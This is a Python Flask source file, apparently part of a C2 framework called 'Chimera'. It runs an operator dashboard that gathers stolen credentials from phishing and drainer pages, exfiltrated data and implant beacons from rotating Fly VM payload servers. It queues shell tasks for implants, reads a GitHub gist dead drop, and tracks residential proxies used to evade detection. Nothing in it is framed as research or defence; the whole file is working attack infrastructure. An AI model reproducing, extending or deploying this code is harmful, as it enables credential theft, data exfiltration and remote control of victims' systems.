# dashboard.py — Operator command center
# Flask app that connects to the active Fly VM payload server
# and provides a web UI for monitoring + tasking

from flask import Flask, render_template, jsonify, request, redirect, url_for
from werkzeug.wrappers import Response
import requests
import time
import threading
from datetime import datetime, timezone
from collections import deque
from typing import Any, Optional

# Import the rotation engine + payload registry
import sys
import os

# Add parent directory to path so we can import core modules
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.chimera_core_v2 import ChimeraRotationV2
from core.payloads_config import build_registry
from core.deaddrop import DeadDrop

app = Flask(__name__)


# ---------------------------------------------------------------
# Global state — the dashboard is the single source of truth
# for the operator. It holds a reference to the rotation engine
# and caches data pulled from the active Fly VM.
# ---------------------------------------------------------------
class DashboardState:
    def __init__(self) -> None:
        self.engine: Optional[ChimeraRotationV2] = None
        self.engine_thread: Optional[threading.Thread] = None
        self.config: Optional[dict[str, Any]] = None
        self.dead_drop: Optional[DeadDrop] = None
        self.cycle_history: deque[dict[str, Any]] = deque(maxlen=24)
        self.creds_cache: list[dict[str, Any]] = []
        self.exfil_cache: list[dict[str, Any]] = []
        self.beacons_cache: dict[str, dict[str, Any]] = {}
        self.tasks_queued: dict[str, list[dict[str, Any]]] = {}
        self.last_sync: float = 0.0
        self.sync_interval: int = 15
        self._lock = threading.Lock()
        self._sync_thread: Optional[threading.Thread] = None
        self._running: bool = False

    def init(self, config: dict[str, Any]) -> None:
        """Initialize dashboard with config and start the rotation engine."""
        self.config = config
        self.dead_drop = DeadDrop(
            gist_token=str(config["github_token"]),
            gist_id=str(config["gist_id"]),
        )
        registry = build_registry()
        self.engine = ChimeraRotationV2(config, registry)

        # Start rotation engine in background
        self._running = True
        self.engine_thread = threading.Thread(target=self.engine.start, daemon=True)
        self.engine_thread.start()

        # Start sync thread (pulls data from active Fly VM)
        self._sync_thread = threading.Thread(target=self._sync_loop, daemon=True)
        self._sync_thread.start()

    def _sync_loop(self) -> None:
        """Background thread: pull creds/exfil/beacons from active Fly VM."""
        while self._running:
            try:
                self._sync_from_fly()
            except Exception:
                pass
            time.sleep(self.sync_interval)

    def _sync_from_fly(self) -> None:
        """Pull latest data from the active Fly VM's payload server."""
        with self._lock:
            if self.engine is None or self.engine.current is None:
                return
            current = self.engine.current
            if not current.get("fly"):
                return

            fly: dict[str, Any] = current["fly"]
            session_key: str = str(current["config"]["key"])
            base_url = f"http://{fly['ip']}:{fly['internal_port']}"

            headers = {"X-CSRF-Token": session_key}

            # Pull credentials
            try:
                resp = requests.get(
                    f"{base_url}/api/vault/creds", headers=headers, timeout=10
                )
                if resp.ok:
                    self.creds_cache = resp.json().get("creds", [])
            except Exception:
                pass

            # Pull exfil data
            try:
                resp = requests.get(
                    f"{base_url}/api/vault/exfil", headers=headers, timeout=10
                )
                if resp.ok:
                    self.exfil_cache = resp.json().get("exfil", [])
            except Exception:
                pass

            # Pull beacon history
            try:
                resp = requests.get(
                    f"{base_url}/api/vault/beacons", headers=headers, timeout=10
                )
                if resp.ok:
                    self.beacons_cache = resp.json().get("beacons", {})
            except Exception:
                pass

            self.last_sync = time.time()

    def get_active_endpoints(self) -> list[dict[str, str]]:
        """Get current active Vercel/Fly endpoints."""
        if self.engine is None or self.engine.current is None:
            return []
        current = self.engine.current
        config: dict[str, Any] = current["config"]
        endpoints: list[dict[str, str]] = []
        for name, url in config.get("endpoints", {}).items():
            endpoints.append({"name": str(name), "url": str(url)})
        if current.get("fly"):
            fly_info: dict[str, Any] = current["fly"]
            endpoints.append({
                "name": "fly-vm-direct",
                "url": f"http://{fly_info['ip']}:{fly_info['internal_port']}",
            })
        return endpoints

    def get_proxy_info(self) -> dict[str, Any]:
        """Get current residential proxy status."""
        if self.engine is not None and self.engine.current is not None:
            proxy = self.engine.current.get("proxy")
            if proxy:
                return proxy
        return {}

    def get_dead_drop_config(self) -> dict[str, Any]:
        """Read the current dead drop config (what implants see)."""
        if self.dead_drop is None:
            return {"error": "Dead drop not initialized"}
        try:
            return self.dead_drop.read()
        except Exception as e:
            return {"error": str(e)}

    def queue_task(self, implant_id: str, task: dict[str, Any]) -> None:
        """Queue a task for an implant. Delivered on next beacon."""
        with self._lock:
            self.tasks_queued.setdefault(implant_id, []).append(task)

        # Also push to the Fly VM so it's ready when the implant beacons
        if self.engine is not None and self.engine.current is not None:
            current = self.engine.current
            if current.get("fly"):
                fly: dict[str, Any] = current["fly"]
                session_key: str = str(current["config"]["key"])
                base_url = f"http://{fly['ip']}:{fly['internal_port']}"
                try:
                    requests.post(
                        f"{base_url}/api/vault/tasks",
                        headers={"X-CSRF-Token": session_key},
                        json={"implant_id": implant_id, "task": task},
                        timeout=10,
                    )
                except Exception:
                    pass  # task is queued locally, will be pushed on next sync

    def get_cycle_info(self) -> dict[str, Any]:
        """Get current rotation cycle info."""
        if self.engine is None or self.engine.current is None:
            return {"status": "initializing"}

        current = self.engine.current
        elapsed = time.time() - current["config"].get("ts_epoch", time.time())
        cycle_min: int = 60
        if self.config is not None:
            cycle_min = int(self.config.get("cycle_minutes", 60))
        remaining = max(0, cycle_min * 60 - elapsed)

        return {
            "status": "active",
            "cycle_ts": current["ts"],
            "elapsed_seconds": int(elapsed),
            "remaining_seconds": int(remaining),
            "cycle_count": len(self.cycle_history) + 1,
            "next_rotation": (
                datetime.now(timezone.utc).strftime("%H:%M UTC")
                if remaining < 3600
                else "N/A"
            ),
        }

    def shutdown(self) -> None:
        self._running = False
        if self.engine is not None:
            self.engine.stop()


state = DashboardState()


# ---------------------------------------------------------------
# Routes
# ---------------------------------------------------------------

@app.route("/")
def overview() -> str:
    """Main dashboard — summary of everything."""
    cycle = state.get_cycle_info()
    endpoints = state.get_active_endpoints()
    proxy = state.get_proxy_info()
    cred_count = len(state.creds_cache)
    exfil_count = len(state.exfil_cache)
    beacon_count = len(state.beacons_cache)
    task_count = sum(len(t) for t in state.tasks_queued.values())

    return render_template(
        "overview.html",
        cycle=cycle,
        endpoints=endpoints,
        proxy=proxy,
        cred_count=cred_count,
        exfil_count=exfil_count,
        beacon_count=beacon_count,
        task_count=task_count,
        last_sync=state.last_sync,
        active_deployments=len(endpoints),
    )


@app.route("/implants")
def implants() -> str:
    """Implant beacon feed + task queue."""
    beacons = state.beacons_cache
    tasks = state.tasks_queued

    # Format beacon data for display
    beacon_list: list[dict[str, str]] = []
    for implant_id, data in beacons.items():
        last_seen = data.get("last_seen", 0)
        ago = int(time.time() - last_seen) if last_seen else 0
        beacon_list.append({
            "id": implant_id,
            "ip": str(data.get("ip", "unknown")),
            "last_seen": f"{ago}s ago" if ago < 3600 else f"{ago // 3600}h ago",
            "status": "active" if ago < 600 else "dormant",
        })

    return render_template("implants.html", beacons=beacon_list, tasks=tasks)


@app.route("/implants/queue", methods=["POST"])
def queue_task_route() -> Response:
    """Queue a new task for an implant."""
    implant_id = request.form.get("implant_id", "default")
    task_type = request.form.get("task_type", "shell")
    task_data = request.form.get("task_data", "")

    task: dict[str, Any] = {
        "type": task_type,
        "data": task_data,
        "ts": int(time.time()),
    }

    state.queue_task(implant_id, task)
    return redirect(url_for("implants"))


@app.route("/vault")
def vault() -> str:
    """Captured credentials from phishing/drainer pages."""
    creds = state.creds_cache
    return render_template("vault.html", creds=creds)


@app.route("/exfil")
def exfil() -> str:
    """Exfiltrated data viewer."""
    exfil_data = state.exfil_cache
    return render_template("exfil.html", exfil=exfil_data)


@app.route("/deployments")
def deployments() -> str:
    """Active Vercel + Fly deployments."""
    endpoints = state.get_active_endpoints()
    cycle = state.get_cycle_info()
    proxy = state.get_proxy_info()

    # Get deployment details from engine
    fly_info: Optional[dict[str, Any]] = None
    vercel_info: list[dict[str, Any]] = []
    if state.engine is not None and state.engine.current is not None:
        current = state.engine.current
        if current.get("fly"):
            fly_info = current["fly"]
        vercel_info = current.get("vercel", [])

    return render_template(
        "deployments.html",
        endpoints=endpoints,
        cycle=cycle,
        proxy=proxy,
        fly=fly_info,
        vercel=vercel_info,
    )


@app.route("/config")
def config_page() -> str:
    """Dead drop config + rotation settings."""
    dd_config = state.get_dead_drop_config()
    cycle = state.get_cycle_info()
    cycle_minutes = 60
    if state.config is not None:
        cycle_minutes = int(state.config.get("cycle_minutes", 60))
    return render_template(
        "config.html",
        dd_config=dd_config,
        cycle=cycle,
        cycle_minutes=cycle_minutes,
    )


# ---------------------------------------------------------------
# API endpoints (for AJAX updates)
# ---------------------------------------------------------------

@app.route("/api/status")
def api_status() -> Response:
    """JSON status endpoint for live updates."""
    cycle = state.get_cycle_info()
    return jsonify({
        "cycle": cycle,
        "cred_count": len(state.creds_cache),
        "exfil_count": len(state.exfil_cache),
        "beacon_count": len(state.beacons_cache),
        "task_count": sum(len(t) for t in state.tasks_queued.values()),
        "last_sync": state.last_sync,
        "endpoints": state.get_active_endpoints(),
        "proxy_exit_ip": state.get_proxy_info().get("exit_ip", "unknown"),
    })


@app.route("/api/creds")
def api_creds() -> Response:
    return jsonify({"creds": state.creds_cache})


@app.route("/api/exfil")
def api_exfil() -> Response:
    return jsonify({"exfil": state.exfil_cache})


@app.route("/api/beacons")
def api_beacons() -> Response:
    return jsonify({"beacons": state.beacons_cache})


@app.route("/api/tasks/queue", methods=["POST"])
def api_queue_task() -> Response:
    data: dict[str, Any] = request.get_json() or {}
    implant_id = str(data.get("implant_id", "default"))
    task: dict[str, Any] = {
        "type": str(data.get("type", "shell")),
        "data": str(data.get("data", "")),
        "ts": int(time.time()),
    }
    state.queue_task(implant_id, task)
    return jsonify({"status": "queued", "implant_id": implant_id})


# ---------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------

def load_config(path: str = "config.yaml") -> dict[str, Any]:
    import yaml

    with open(path) as f:
        result: dict[str, Any] = yaml.safe_load(f)
    return result


if __name__ == "__main__":
    app_config = load_config()
    state.init(app_config)
    print(f"[dashboard] Starting on http://localhost:4444")
    print(
        f"[dashboard] Rotation engine: active "
        f"(cycle={app_config.get('cycle_minutes', 60)}min)"
    )
    try:
        app.run(host="127.0.0.1", port=4444, debug=False)
    except KeyboardInterrupt:
        state.shutdown()
        print("[dashboard] Shut down. All infrastructure destroyed.")
